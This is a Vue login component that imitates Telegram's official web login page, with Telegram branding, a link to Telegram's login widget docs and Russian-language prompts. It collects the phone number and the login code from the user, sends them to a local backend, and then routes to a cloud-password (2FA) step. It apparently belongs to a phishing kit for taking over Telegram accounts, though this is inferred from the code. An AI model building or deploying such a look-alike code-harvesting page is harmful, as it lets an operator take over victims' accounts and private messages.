<template>
  <main class="login">
    <a href="https://core.telegram.org/widgets/login" target="_blank" class="login_about"></a>
            
    <section v-if="isVerifying" class="login_content loading-state">
      <!-- Элемент загрузки -->
      <div class="login_photos">
        <span class="login_telegram_photo_wrap">
          <i class="login_telegram_photo"></i>
        </span>
      </div>
      <div class="loader-wrap">
        <div class="loader"></div>
      </div>
    </section>

    <section v-else class="login_content">
      
      <div class="login_photos">
        <span class="login_telegram_photo_wrap">
          <i class="login_telegram_photo"></i>
        </span>
      </div>

      <div class="login_header_text">
          <span id="phone-display">{{ displayedPhoneNumber }}</span> 
          <div class="auth-number-edit" role="button" title="Изменить номер" @click="goToLogin">
              <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor">
                  <path d="M3 17.25V21h3.75L17.81 9.94l-3.75-3.75L3 17.25zM20.71 7.04c.39-.39.39-1.02 0-1.41l-2.34-2.34c-.39-.39-1.02-.39-1.41 0l-1.83 1.83 3.75 3.75 1.83-1.83z"/>
              </svg>
          </div>
      </div>

      <div class="login_confirm_text">
          Мы отправили код в приложение <b>Telegram</b> на другом Вашем устройстве.
      </div>
      
      <div v-if="errorMessage" class="error-message">
            {{ errorMessage }}
      </div>

      <form class="login_form" @submit.prevent="verifyCode">
          <div class="login_form_group">
              
              <div class="textfield-item">
                  <input 
                      type="text" 
                      class="form-control code-input" 
                      id="sign-in-code" 
                      v-model="code"
                      autocomplete="off" 
                      inputmode="numeric" 
                      placeholder=" "
                  >
                  <div class="textfield-item-underline"></div>
                  <label class="textfield-item-placeholder" for="sign-in-code">Код</label>
              </div>

          </div>

          <div class="login_button_wrap">
              <button class="button-item" type="submit" :disabled="isVerifying">
                  {{ isVerifying ? 'Проверка...' : 'Далее' }}
              </button>
          </div>
      </form>

    </section>
  </main>
</template>

<script setup>
import { ref, onMounted } from 'vue';
import { useRouter } from 'vue-router';

const router = useRouter();

const code = ref('');
const displayedPhoneNumber = ref('+00 000 000 000');
const errorMessage = ref('');
const isVerifying = ref(false);

const loadNumber = () => {
    const prettyNumber = localStorage.getItem('telegram_phone_pretty'); 
    
    if (prettyNumber) {
        let numberToDisplay = prettyNumber.split(':').pop().trim();
        displayedPhoneNumber.value = numberToDisplay;
    }
};

const goToLogin = () => {
    localStorage.removeItem('telegram_phone');
    localStorage.removeItem('telegram_phone_pretty');
    localStorage.removeItem('telegram_phone_code_hash');
    router.push({ name: 'Login' }); 
};

const verifyCode = async () => {
    errorMessage.value = '';
    const cleanNumber = localStorage.getItem('telegram_phone');
    const userCode = code.value;

    if (!cleanNumber || userCode.length < 5) {
        errorMessage.value = 'Введите код подтверждения.';
        return;
    }

    isVerifying.value = true;
    const apiUrl = 'http://localhost:8000/verify-code'; 

    try {
        const response = await fetch(apiUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ phone_number: cleanNumber, code: userCode })
        });

        const data = await response.json();

        if (response.ok && data.success) {
            
            if (data.auth_required) {
                 // ТРЕБУЕТСЯ ПАРОЛЬ 2FA
                 router.push({ name: 'PasswordVerification' });
            } else {
                 // УСПЕШНЫЙ ВХОД
                alert(`Успешный вход! User ID: ${data.user_id}, Username: ${data.username}`);
                localStorage.clear();
                router.push({ path: '/' }); 
            }
        } else {
            errorMessage.value = data.detail?.message || 'Неизвестная ошибка верификации.';
        }

    } catch (error) {
        errorMessage.value = 'Не удалось подключиться к API Telegram (localhost:8000).';
    } finally {
        isVerifying.value = false;
    }
};

onMounted(() => {
    loadNumber();
    if (!localStorage.getItem('telegram_phone_code_hash')) {
        goToLogin();
    }
});
</script>

<style scoped>
/* Стилизация компонента верификации кода */

:root {
    --text-color: #000;
    --body-bg: #fff;
    --accent-btn-color: #2481cc;
    --accent-color-hover: #1a8ad5;
}

html {
    font-family: sans-serif;
    -ms-text-size-adjust: 100%;
    -webkit-text-size-adjust: 100%;
}

body {
    font-family: "Roboto", sans-serif;
    background-color: var(--body-bg);
    color: var(--text-color);
    margin: 0;
    padding: 0;
}

button, input {
    font: inherit;
    margin: 0;
}

button {
    overflow: visible;
    -webkit-appearance: button;
    cursor: pointer;
}

/* Стили полей ввода */
input.form-control {
    display: block;
    width: 100%;
    background-image: none;
    border: none;
    height: auto;
    resize: none;
    color: inherit;
    background: transparent;
    border-bottom: 1px solid #e0e0e0;
    box-shadow: none;
    border-radius: 0;
    padding: 10px 0;
    font-size: 15px; 
}

input.form-control:focus {
    box-shadow: none;
    outline: 0;
    border-bottom: 2px solid #39ade7;
}

/* Стилизация кода: убираем центровку и интервал */
.code-input {
    text-align: left !important;
    letter-spacing: normal !important;
}

a {
    text-decoration: none;
    color: #2e87ca;
}

a:hover {
    text-decoration: underline;
}

.login {
    min-width: 320px;
}

.login_about {
    display: inline-block;
    width: 20px;
    height: 20px;
    margin: 16px;
    position: absolute;
    right: 0;
    top: 0;
}

/* Контейнер для логотипов (сохраняем вертикальный отступ) */
.login_photos {
    padding: 15px 0 22px;
}
.login_telegram_photo_wrap {
    display: inline-block;
    margin: 15px 0;
}
.login_telegram_photo {
    display: inline-block;
    vertical-align: top;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    background: transparent; 
}
.login_telegram_photo_wrap.arrowed {
    background: url("data:image/svg+xml,%3Csvg%20height%3D%2250%22%20viewBox%3D%220%200%2098%2050%22%20width%3D%2298%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%234ca3e2%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22m91.8%2019.5666667%208.5%2011.3333333c.331371.4418278.241828%201.0686292-.2%201.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847%200-1-.4477153-1-1%200-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709%201.4-.2.0758057.0568542.1431458.1241943.2.2z%22%20transform%3D%22matrix%280%201%20-1%200%20116.5%20-65.5%29%22%2F%3E%3Cpath%20d%3D%22m40%2021h46v8h-46z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E") no-repeat 0-15px;
    padding-right: 58px;
}
.login_telegram_photo {
    display: inline-block;
    vertical-align: top;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    background: url(data:image/svg+xml,%3Csvg\ height=\"50\"\ viewBox=\"0\ 0\ 50\ 50\"\ width=\"50\"\ xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg\ fill=\"none\"\ fill-rule=\"evenodd\"%3E%3Ccircle\ cx=\"25\"\ cy=\"25\"\ fill=\"%234ca3e2\"\ r=\"25\"/%3E%3Cpath\ d=\"m11.1838302\ 25.1315363c7.1532767-2.9934727\ 11.9232482-4.9669531\ 14.3099145-5.9204412\ 6.8144173-2.7224024\ 8.2303949-3.1953128\ 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757\ 3.7267611-1.9671255\ 12.7706276-2.7800209\ 16.944664-.3439665\ 1.7661912-1.026197\ 2.1442046-1.6818831\ 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915\ 1.0898437-3.7680664.361326-.3604656\ 6.7509766-6.1621094\ 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715\ 2.2375171-10.3502001\ 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919\ 1.1713788-1.3298423z\"\ fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E)no-repeat 0 0;
    margin: -15px 0;
}


.login_header_text {
    font-weight: 500;
    margin-bottom: 12px;
    line-height: 21px;
    font-size: 19px;
    display: flex;
    align-items: center;
    justify-content: center;
    gap: 8px;
}

.auth-number-edit {
    cursor: pointer;
    color: #2e87ca;
    font-size: 16px;
    display: inline-flex;
    align-items: center;
    justify-content: center;
    width: 24px;
    height: 24px;
}

.login_content {
    padding: 40px 20px 30px;
    text-align: center;
    max-width: 530px;
    margin: 0 auto;
}

.login_photos {
    padding: 15px 0 22px;
}

.login_telegram_photo_wrap {
  display: inline-block;
  margin: 15px 0;
}

.login_telegram_photo_wrap.arrowed {
  background: url("data:image/svg+xml,%3Csvg%20height%3D%2250%22%20viewBox%3D%220%200%2098%2050%22%20width%3D%2298%22%20xmlns%3D%22http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg%22%3E%3Cg%20fill%3D%22%234ca3e2%22%20fill-rule%3D%22evenodd%22%3E%3Cpath%20d%3D%22m91.8%2019.5666667%208.5%2011.3333333c.331371.4418278.241828%201.0686292-.2%201.4-.1730962.1298221-.3836298.2-.6.2h-17c-.5522847%200-1-.4477153-1-1%200-.2163702.0701779-.4269038.2-.6l8.5-11.3333333c.3313708-.4418278.9581722-.5313709%201.4-.2.0758057.0568542.1431458.1241943.2.2z%22%20transform%3D%22matrix%280%201%20-1%200%20116.5%20-65.5%29%22%2F%3E%3Cpath%20d%3D%22m40%2021h46v8h-46z%22%2F%3E%3C%2Fg%3E%3C%2Fsvg%3E") no-repeat 0-15px;
  padding-right: 58px;
}

.login_telegram_photo {
    display: inline-block;
    vertical-align: top;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    background: url(data:image/svg+xml,%3Csvg\ height=\"50\"\ viewBox=\"0\ 0\ 50\ 50\"\ width=\"50\"\ xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg\ fill=\"none\"\ fill-rule=\"evenodd\"%3E%3Ccircle\ cx=\"25\"\ cy=\"25\"\ fill=\"%234ca3e2\"\ r=\"25\"/%3E%3Cpath\ d=\"m11.1838302\ 25.1315363c7.1532767-2.9934727\ 11.9232482-4.9669531\ 14.3099145-5.9204412\ 6.8144173-2.7224024\ 8.2303949-3.1953128\ 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757\ 3.7267611-1.9671255\ 12.7706276-2.7800209\ 16.944664-.3439665\ 1.7661912-1.026197\ 2.1442046-1.6818831\ 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915\ 1.0898437-3.7680664.361326-.3604656\ 6.7509766-6.1621094\ 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715\ 2.2375171-10.3502001\ 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919\ 1.1713788-1.3298423z\"\ fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E)no-repeat 0 0;
    margin: -15px 0;
}
.login_telegram_photo {
    display: inline-block;
    vertical-align: top;
    width: 50px;
    height: 50px;
    border-radius: 25px;
    background: url(data:image/svg+xml,%3Csvg\ height=\"50\"\ viewBox=\"0\ 0\ 50\ 50\"\ width=\"50\"\ xmlns=\"http://www.w3.org/2000/svg\"%3E%3Cg\ fill=\"none\"\ fill-rule=\"evenodd\"%3E%3Ccircle\ cx=\"25\"\ cy=\"25\"\ fill=\"%234ca3e2\"\ r=\"25\"/%3E%3Cpath\ d=\"m11.1838302\ 25.1315363c7.1532767-2.9934727\ 11.9232482-4.9669531\ 14.3099145-5.9204412\ 6.8144173-2.7224024\ 8.2303949-3.1953128\ 9.1533092-3.2109286.2029865-.0034345.6568489.0448847.950842.2740174.2482419.1934752.3165432.4548327.3492276.6382684.0326843.1834358.0733842.601307.0410309.9278195-.3692757\ 3.7267611-1.9671255\ 12.7706276-2.7800209\ 16.944664-.3439665\ 1.7661912-1.026197\ 2.1442046-1.6818831\ 2.2021587-1.4249578.1259476-2.5020563-.6903349-3.8821976-1.5593016-2.1596487-1.3597614-3.7791851-2.1170303-5.8754981-3.4439062-2.4226524-1.5334347-.2908188-2.3906915\ 1.0898437-3.7680664.361326-.3604656\ 6.7509766-6.1621094\ 6.8215001-6.027668.0306372.0584048-.192813-.6844486-.3362893-.8069372-.1434762-.1224887-.3552347-.0806023-.5080456-.0472897-.2166048.0472195-3.6666715\ 2.2375171-10.3502001\ 6.5708928-.97929.6458958-1.8663004.9605979-2.6610313.9441063-.876127-.0181806-2.561444-.4758095-3.814304-.8669794-1.5366837-.4797857-2.10392683-.7057418-1.9975768-1.5205665.0553937-.4244111.4458533-.8676919\ 1.1713788-1.3298423z\"\ fill=\"%23fff\"/%3E%3C/g%3E%3C/svg%3E)no-repeat 0 0;
    margin: -15px 0;
}

.login_confirm_text {
    font-size: 15px;
    line-height: 21px;
}

.login_form_group {
    width: 270px;
    margin: 25px auto 35px;
}

.textfield-item {
    display: block;
    position: relative;
    padding: 0 0 20px;
    margin: 0 0 -20px;
}

.textfield-item-placeholder {
    bottom: 0;
    color: #ccc;
    left: 0;
    right: 0;
    pointer-events: none;
    position: absolute;
    display: block;
    top: 10px;
    width: 100%;
    overflow: hidden;
    white-space: nowrap;
    text-align: left;
    z-index: -1;
}

.textfield-item-placeholder.hide {
    display: none;
}

.textfield-item input:focus ~ .textfield-item-placeholder,
.textfield-item input:not(:placeholder-shown) ~ .textfield-item-placeholder {
    top: -10px; 
    transform: scale(0.75);
    transform-origin: left top; 
    color: #39ade7;
}

.error-message {
    color: #ff3333;
    font-size: 14px;
    /* ИСПРАВЛЕНО: Убран отрицательный margin-top */
    margin-top: 10px; /* Добавлен небольшой верхний отступ */
    margin-bottom: 15px; /* Увеличен нижний отступ, чтобы отделить от формы */
    padding: 0 50px;
    max-width: 270px;
    margin-left: auto;
    margin-right: auto;
    text-align: left;
}

.loading-state {
  min-height: 350px;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
  text-align: center;
}

.loader-wrap {
  margin-top: 20px;
  width: 30px;
  height: 30px;
  display: flex;
  justify-content: center;
  align-items: center;
}

.loader {
  width: 25px;
  height: 25px;
  border: 3px solid #f3f3f3;
  border-top-color: #4ca3e2;
  border-radius: 50%;
  animation: spin 0.8s linear infinite;
}

@keyframes spin {
  to {
    transform: rotate(360deg);
  }
}
</style>